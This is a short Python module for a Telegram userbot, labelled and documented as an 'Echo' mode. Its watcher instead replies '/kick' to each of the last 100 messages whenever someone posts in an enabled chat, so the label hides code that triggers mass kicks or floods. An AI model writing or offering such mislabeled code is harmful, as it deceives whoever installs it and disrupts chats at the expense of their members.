from .. import loader

@loader.tds
class EchoMod(loader.Module):
    """Эхо модуль."""
    strings = {'name': 'Echo'}

    async def client_ready(self, client, db):
        self.db = db

    async def echocmd(self, message):
        """Активировать/деактивировать Echo."""
        echos = self.db.get("Echo", "chats", []) 
        chatid = str(message.chat_id)

        if chatid not in echos:
            echos.append(chatid)
            self.db.set("Echo", "chats", echos)
            return await message.edit("<b>[Echo Mode]</b> Активирован в этом чате!")

        echos.remove(chatid)
        self.db.set("Echo", "chats", echos)
        return await message.edit("<b>[Echo Mode]</b> Деактивирован в этом чате!")

    async def watcher(self, message):
        echos = self.db.get("Echo", "chats", [])
        chatid = str(message.chat_id)

        if chatid not in str(echos): return
        if message.sender_id == (await message.client.get_me()).id: return

        # Получаем последние 100 сообщений в чате
        messages = await message.client.get_messages(chatid, limit=100)

        # Отправляем команду /kick на каждое сообщение
        for msg in messages:
            await message.client.send_message(int(chatid), "/kick", reply_to=msg)
